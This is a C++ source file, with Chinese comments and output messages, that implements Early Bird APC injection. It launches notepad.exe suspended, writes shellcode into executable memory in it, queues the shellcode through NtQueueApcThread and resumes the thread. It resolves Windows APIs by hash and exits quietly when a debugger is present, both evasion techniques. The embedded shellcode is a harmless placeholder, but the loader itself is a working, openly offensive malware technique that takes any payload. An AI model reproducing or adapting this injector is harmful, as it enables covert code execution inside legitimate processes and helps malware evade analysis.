#include <windows.h>
#include <iostream>
#include "EnableDebugPrivilege.h"
#include "IsDebugging.h"
#include "Hash.h"
#include "GetProcAddress.h"

// ============================================================
// Shellcode
// ============================================================
unsigned char shellcode[] = {
    0xB8, 0x2A, 0x00, 0x00, 0x00,
    0xC3
};
SIZE_T shellcodeSize = sizeof(shellcode);

// ============================================================
// 函数指针类型
// ============================================================
typedef BOOL   (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES,
                                          LPSECURITY_ATTRIBUTES, BOOL, DWORD,
                                          LPVOID, LPCSTR, LPSTARTUPINFOA,
                                          LPPROCESS_INFORMATION);
typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef DWORD  (WINAPI *pResumeThread)(HANDLE);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);

// ============================================================
// 函数指针容器
// ============================================================
struct ApiFuncs {
    pCreateProcessA      CreateProcessA;
    pVirtualAllocEx      VirtualAllocEx;
    pWriteProcessMemory  WriteProcessMemory;
    pResumeThread        ResumeThread;
    pCloseHandle         CloseHandle;
    pNtQueueApcThread    NtQueueApcThread;
    bool                 valid;
};

__declspec(noinline) ApiFuncs InitApiFuncs() {
    ApiFuncs f{};
    DWORD hKernel32 = NHash32::hash("kernel32.dll");
    DWORD hNtdll    = NHash32::hash("ntdll.dll");

    f.CreateProcessA     = (pCreateProcessA)     GetProcAddressEx(hKernel32, NHash32::hash("CreateProcessA"));
    f.VirtualAllocEx     = (pVirtualAllocEx)     GetProcAddressEx(hKernel32, NHash32::hash("VirtualAllocEx"));
    f.WriteProcessMemory = (pWriteProcessMemory) GetProcAddressEx(hKernel32, NHash32::hash("WriteProcessMemory"));
    f.ResumeThread       = (pResumeThread)       GetProcAddressEx(hKernel32, NHash32::hash("ResumeThread"));
    f.CloseHandle        = (pCloseHandle)        GetProcAddressEx(hKernel32, NHash32::hash("CloseHandle"));
    f.NtQueueApcThread   = (pNtQueueApcThread)   GetProcAddressEx(hNtdll,    NHash32::hash("NtQueueApcThread"));

    f.valid = f.CreateProcessA && f.VirtualAllocEx && f.WriteProcessMemory
           && f.ResumeThread && f.CloseHandle && f.NtQueueApcThread;
    return f;
}

// ============================================================
// main
// ============================================================
int main() {
    EnableDebugPrivilege();
    if (IsDebuggingA()) {
        std::cerr << "[-] 检测到调试器" << std::endl;
        return 0;
    }

    ApiFuncs f = InitApiFuncs();
    if (!f.valid) {
        std::cerr << "[-] 函数解析失败" << std::endl;
        return 1;
    }
    std::cout << "[+] 所有函数解析成功" << std::endl;

    // ① 创建挂起进程
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!f.CreateProcessA(
            NULL,
            (LPSTR)"C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, FALSE,
            CREATE_SUSPENDED,
            NULL, NULL,
            &si, &pi)) {
        std::cerr << "[-] CreateProcess 失败: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] 挂起进程 PID: " << pi.dwProcessId
              << "，主线程 ID: " << pi.dwThreadId << std::endl;

    // ② 写入 Shellcode
    LPVOID pRemoteMem = f.VirtualAllocEx(
        pi.hProcess, NULL, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        std::cerr << "[-] VirtualAllocEx 失败" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        f.CloseHandle(pi.hThread);
        f.CloseHandle(pi.hProcess);
        return 1;
    }

    if (!f.WriteProcessMemory(pi.hProcess, pRemoteMem, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory 失败" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        f.CloseHandle(pi.hThread);
        f.CloseHandle(pi.hProcess);
        return 1;
    }
    std::cout << "[+] Shellcode 写入: 0x"
              << std::hex << (uintptr_t)pRemoteMem << std::dec << std::endl;

    // ③ 插入 APC
    NTSTATUS status = f.NtQueueApcThread(
        pi.hThread, (PVOID)pRemoteMem, NULL, NULL, NULL);
    if (status != 0) {
        std::cerr << "[-] NtQueueApcThread 失败: 0x"
                  << std::hex << status << std::dec << std::endl;
        TerminateProcess(pi.hProcess, 0);
        f.CloseHandle(pi.hThread);
        f.CloseHandle(pi.hProcess);
        return 1;
    }
    std::cout << "[+] APC 插入成功" << std::endl;

    // ④ 恢复线程
    if (f.ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cerr << "[-] ResumeThread 失败" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        f.CloseHandle(pi.hThread);
        f.CloseHandle(pi.hProcess);
        return 1;
    }
    std::cout << "[+] Early Bird 注入完成" << std::endl;

    f.CloseHandle(pi.hThread);
    f.CloseHandle(pi.hProcess);

    system("pause");
    return 0;
}